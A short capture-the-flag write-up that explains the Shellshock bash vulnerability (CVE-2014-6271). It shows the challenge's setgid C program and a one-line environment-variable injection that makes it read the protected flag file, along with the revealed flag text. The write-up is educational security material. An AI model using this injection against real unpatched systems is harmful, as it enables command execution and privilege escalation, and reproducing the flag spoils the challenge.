# shellshock

The home folder of this challenge contains the following:

```
shellshock@ubuntu:~$ ls -l
total 960
-r-xr-xr-x 1 root shellshock     959120 Oct 12  2014 bash
-r--r----- 1 root shellshock_pwn     47 Oct 12  2014 flag
-r-xr-sr-x 1 root shellshock_pwn   8547 Oct 12  2014 shellshock
-r--r--r-- 1 root root              188 Oct 12  2014 shellshock.c
```

### shellshock.c
```c
#include <stdio.h>
int main(){
	setresuid(getegid(), getegid(), getegid());
	setresgid(getegid(), getegid(), getegid());
	system("/home/shellshock/bash -c 'echo shock_me'");
	return 0;
}
```

Shellshock is a vulnerability in bash, where bash incorrectly executes trailing commands when it imports a function definition stored into an environment variable.

This is how shellshock works:

```
$ env x='() { :; }; echo pwned' bash -c echo real program
  ^^^^^^^^^^^^^^^^^                                  Command to set the environment variable
                   ^^^^^^^^^^^^                      The arbitrary command which will executed by bash
                               ^^^^^^^^^^^^^^^^^^^^  Real command
```

If the bash is vulnerable for shellshock, the arbitrary command that is set in the environment variable will be executed (with the privileges of the bash user) before executing the real command.

```
shellshock@ubuntu:~$ which cat
/bin/cat
shellshock@ubuntu:~$ env x='() { :; }; /bin/cat flag' ./shellshock
only if I knew CVE-2014-6271 ten years ago..!!
Segmentation fault
```
